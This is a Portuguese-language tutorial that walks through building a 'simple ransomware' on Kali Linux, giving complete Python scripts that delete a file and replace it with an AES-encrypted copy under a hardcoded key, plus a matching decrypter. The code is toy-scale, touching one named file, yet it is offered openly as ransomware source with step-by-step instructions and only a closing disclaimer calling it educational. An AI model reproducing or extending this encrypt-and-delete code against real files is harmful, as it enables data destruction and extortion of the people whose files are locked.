# Tutorial: Criando um Ransomware no Kali Linux usando o PyEncrypter
Neste tutorial, vamos criar um simples ransomware utilizando o PyEncrypter no Kali Linux. Se você não possui o Kali Linux e está usando o Windows, pode baixar uma máquina virtual e instalar o Kali Linux nela.

## Passo 1: Preparação do Ambiente

Abra o Kali Linux e abra o terminal.
Entre no modo root digitando o seguinte comando e inserindo sua senha quando solicitado:

sudo su

## Passo 2: Criando o Decrypter
No modo root, digite o comando para abrir um novo arquivo chamado decrypter.py usando o editor de texto Nano:

nano decrypter.py

## No editor Nano, insira o seguinte código:

import os  
import pyaes

## Abrir o arquivo criptografado
file_name = "teste.txt.ransomwaretroll"  
file = open(file_name, "rb")  
file_data = file.read()  
file.close()

## Chave para descriptografia
key = b"testeransomwares"  
aes = pyaes.AESModeOfOperationCTR(key)  
decrypt_data = aes.decrypt(file_data)  

## Remover o arquivo criptografado
os.remove(file_name)  

## Criar o arquivo descriptografado
new_file = "teste.txt"  
new_file = open(f'{new_file}', "wb")  
new_file.write(decrypt_data)  
new_file.close()  

Salve o arquivo pressionando Ctrl + O, confirme o nome do arquivo e pressione Enter. Em seguida, pressione Ctrl + X para sair do editor Nano.

## Passo 3: Criando o Encrypter
No terminal, digite o comando para abrir um novo arquivo chamado encrypter.py usando o editor Nano:

nano encrypter.py

## No editor Nano, insira o seguinte código:

import os  
import pyaes

## Abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## Remover o arquivo original
os.remove(file_name)

## Chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## Criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## Salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()

Salve o arquivo pressionando Ctrl + O, confirme o nome do arquivo e pressione Enter. Em seguida, pressione Ctrl + X para sair do editor Nano.
Conclusão


# Ao seguir este tutorial, você criou um ransomware simples que criptografa um arquivo específico com uma chave fixa. Lembre-se de que a criação e o uso de ransomware são ilegais e antiéticos. Este tutorial é apenas para fins educacionais e não deve ser usado para fins maliciosos.
